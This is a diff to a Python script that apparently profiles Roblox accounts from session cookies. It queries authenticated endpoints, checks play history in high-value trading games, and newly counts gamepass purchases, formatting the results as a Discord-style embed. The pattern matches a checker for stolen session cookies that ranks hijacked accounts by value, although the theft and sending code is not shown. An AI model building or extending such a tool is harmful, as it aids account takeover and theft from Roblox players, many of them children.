@@ -1,6 +1,7 @@
 import sys
 import os
 import re
+import time
 import requests
 from datetime import datetime, timezone
 
@@ -64,6 +65,10 @@ def main():
         auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=10)
         print(f"DEBUG: Auth endpoint status code: {auth_res.status_code}", file=sys.stderr)
         
+        # Handle invalid or expired session cookies gracefully (401/403)
+        if auth_res.status_code in (401, 403):
+            print("Error: Invalid, expired, or unauthorized cookie (401/403).", file=sys.stderr)
+
         user_id = None
         username = "Unknown User"
         display_name = "Unknown"
@@ -83,6 +88,7 @@ def main():
         adopt_me = False
         mm2 = False
         ps99 = False
+        gamepasses_bought = 0
 
         if auth_res.status_code == 200:
             auth_data = auth_res.json()
@@ -165,6 +171,35 @@ def main():
                         if not cursor:
                             return False
 
+                def get_gamepasses_bought():
+                    """Paginate through purchase transactions and count entries where details.type == 'GamePass'."""
+                    count = 0
+                    cursor = ""
+                    while True:
+                        url = f"https://economy.roblox.com/v2/users/{user_id}/transactions"
+                        params = {"transactionType": "Purchase", "limit": 100}
+                        if cursor:
+                            params["cursor"] = cursor
+                        try:
+                            res = session.get(url, params=params, timeout=10)
+                            if res.status_code == 429:  # Rate-limited handling
+                                time.sleep(5)
+                                continue
+                            if res.status_code in (401, 403):
+                                break
+                            res.raise_for_status()
+                            body = res.json()
+                            for item in body.get("data", []):
+                                details = item.get("details")
+                                if details and details.get("type") == "GamePass":
+                                    count += 1
+                            cursor = body.get("nextPageCursor")
+                            if not cursor:
+                                break
+                        except Exception:
+                            break
+                    return count
+
                 try:
                     user = get_user_info()
                     created = user.get("created", "")
@@ -186,6 +221,7 @@ def main():
                     adopt_me = check_played(383310974)
                     mm2 = check_played(142823291)
                     ps99 = check_played(3259657279)
+                    gamepasses_bought = get_gamepasses_bought()
                 except Exception:
                     pass
 
@@ -211,7 +247,7 @@ def main():
                         },
                         {
                             "name": "📊 Account Stats",
-                            "value": f"```diff\n+ Account Age: {age_days} Days\n+ Game Visits: {developer}\n+ Group Members: {group_count}\n```",
+                            "value": f"```diff\n+ Account Age: {age_days} Days\n+ Game Visits: {developer}\n+ Group Members: {group_count}\n+ Gamepasses bought: {gamepasses_bought}\n```",
                             "inline": False
                         },
                         {
